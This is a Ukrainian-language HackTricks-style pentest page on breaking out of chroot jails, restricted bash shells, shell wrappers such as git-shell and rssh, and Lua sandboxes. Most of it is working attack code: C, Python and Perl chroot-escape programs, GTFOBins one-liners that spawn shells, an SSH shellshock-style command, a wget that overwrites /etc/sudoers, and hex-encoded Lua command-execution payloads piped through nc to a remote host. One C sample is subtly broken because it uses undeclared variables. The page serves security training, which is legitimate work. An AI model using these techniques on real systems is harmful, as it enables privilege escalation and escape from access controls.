# Вихід із jail

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Перевірте** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **чи можете ви виконати будь-який binary із властивістю "Shell"**

## Вихід із Chroot

Із [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Механізм chroot **не призначений для захисту** від навмисного втручання з боку **привілейованих** (**root**) **користувачів**. У більшості систем контексти chroot некоректно працюють у вкладеному режимі, а програми в chroot **із достатніми привілеями можуть виконати другий chroot, щоб вийти з нього**.\
Зазвичай це означає, що для виходу вам потрібно мати root усередині chroot.

> [!TIP]
> **Tool** [**chw00t**](https://github.com/earthquake/chw00t) було створено для використання наведених сценаріїв і виходу з `chroot`.

### Root + CWD

> [!WARNING]
> Якщо ви є **root** усередині chroot, ви **можете вийти**, створивши **інший chroot**. Це відбувається тому, що 2 chroot не можуть співіснувати (у Linux), тож якщо ви створите папку, а потім **створите новий chroot** у цій новій папці, перебуваючи **за її межами**, ви опинитеся **за межами нового chroot** і, відповідно, у FS.
>
> Це відбувається тому, що зазвичай chroot НЕ переміщує вашу робочу директорію до вказаної, тож ви можете створити chroot, але залишатися за його межами.

Зазвичай усередині chroot jail немає binary `chroot`, але ви **можете скомпілювати, завантажити та виконати** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Збережений fd

> [!WARNING]
> Це схоже на попередній випадок, але в цьому випадку **атакер зберігає файловий дескриптор поточного каталогу**, а потім **створює chroot у новій папці**. Зрештою, оскільки він має **доступ** до цього **FD** **за межами** chroot, він отримує до нього доступ і **втікає**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD можна передати через Unix Domain Sockets, тому:
>
> - Створіть дочірній процес (fork)
> - Створіть UDS, щоб батьківський і дочірній процеси могли взаємодіяти
> - Виконайте chroot у дочірньому процесі в іншій папці
> - У батьківському proc створіть FD папки, яка розташована за межами chroot нового дочірнього proc
> - Передайте цей FD дочірньому proc за допомогою UDS
> - Дочірній процес виконає chdir до цього FD, і оскільки він розташований за межами його chroot, процес вийде з jail

### Root + Mount

> [!WARNING]
>
> - Змонтуйте кореневий пристрій (/) у директорію всередині chroot
> - Виконайте chroot до цієї директорії
>
> Це можливо в Linux

### Root + /proc

> [!WARNING]
>
> - Змонтуйте procfs у директорію всередині chroot (якщо він ще не змонтований)
> - Знайдіть pid, який має інший запис root/cwd, наприклад: /proc/1/root
> - Виконайте chroot до цього запису

### Root(?) + Fork

> [!WARNING]
>
> - Створіть Fork (дочірній proc), виконайте chroot в іншу папку глибше у FS і виконайте CD до неї
> - Із батьківського процесу перемістіть папку, у якій перебуває дочірній процес, до папки, що розташована перед chroot дочірнього процесу
> - Цей дочірній процес опиниться за межами chroot

### ptrace

> [!WARNING]
>
> - Раніше користувачі могли налагоджувати власні процеси з іншого власного процесу... але тепер це більше не дозволено за замовчуванням
> - У будь-якому разі, якщо це можливо, ви можете виконати ptrace процесу та запустити shellcode всередині нього ([дивіться цей приклад](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Перерахування

Отримайте інформацію про jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Змінення PATH

Перевірте, чи можете ви змінити змінну середовища PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Використання vim
```bash
:set shell=/bin/sh
:shell
```
### Пейджери та переглядачі довідки

У багатьох обмежених середовищах усе ще доступні **пейджери** або **переглядачі довідки**. Зазвичай їх швидше використати для зловживань, ніж намагатися відновити `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Якщо доступний `git`, пам’ятайте, що його довідковий вивід зазвичай проходить через pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Поширені однорядкові команди GTFOBins

Після того як ви визначили, до яких бінарних файлів є доступ, спочатку перевірте очевидні засоби запуску shell:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Якщо ви можете лише **вставляти аргументи** в дозволену команду (замість її вільного запуску), також перевірте **GTFOArgs**.

### Створення скрипту

Перевірте, чи можете ви створити виконуваний файл із вмістом _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Отримання bash через SSH

Якщо ви отримуєте доступ через ssh, часто можна попросити сервер виконати **іншу програму** замість обмеженої оболонки входу:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Якщо `ssh` є одним із небагатьох локально дозволених бінарних файлів, пам’ятайте, що його також можна зловживати як **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Ви можете перезаписати, наприклад, файл sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Обмежені оболонки-обгортки (`git-shell`, `rssh`, `lshell`)

У деяких середовищах ви потрапляєте не у звичайний `rbash`, а в **обгортки** на кшталт `git-shell`, `rssh` або `lshell`:

- `git-shell` приймає лише серверні Git-команди, а також усе, що знаходиться всередині `~/git-shell-commands/`. Якщо цей каталог існує, виконайте `help`, щоб перелічити дозволені користувацькі дії. Якщо ви можете **записувати** туди, будь-який виконуваний файл, розміщений у цьому каталозі, стане доступним.
- `rssh` / `lshell` зазвичай дозволяють лише `scp`, `sftp`, `rsync` або операції у стилі Git. У таких випадках спочатку зосередьтеся на **примітивах запису файлів**: завантажте `authorized_keys`, стартовий файл оболонки або допоміжний скрипт у доступне для запису місце, а потім повторно підключіться за допомогою `ssh -t ...`.
- Якщо обгортка лише фільтрує командний рядок, перелічіть доступні бінарні файли, а потім скористайтеся **GTFOBins / GTFOArgs**.

### Інші трюки

Також перевірте:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Також може бути цікавою сторінка:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Трюки для escape із python jails наведено на такій сторінці:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

На цій сторінці можна знайти глобальні функції, доступні всередині lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval із виконанням команд:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Деякі прийоми для **виклику функцій бібліотеки без використання крапок**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Перелічити функції бібліотеки:
```bash
for k,v in pairs(string) do print(k,v) end
```
Зверніть увагу, що щоразу, коли ви виконуєте попередній **one liner** у **різному lua environment**, порядок функцій змінюється. Тому, якщо вам потрібно виконати певну функцію, ви можете здійснити **brute force attack**, завантажуючи різні lua environments і викликаючи першу функцію бібліотеки le:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Отримати інтерактивну lua shell**: Якщо ви перебуваєте в обмеженій lua shell, можна отримати нову lua shell (і, сподіваємося, необмежену), викликавши:
```bash
debug.debug()
```
## Посилання

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Слайди: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
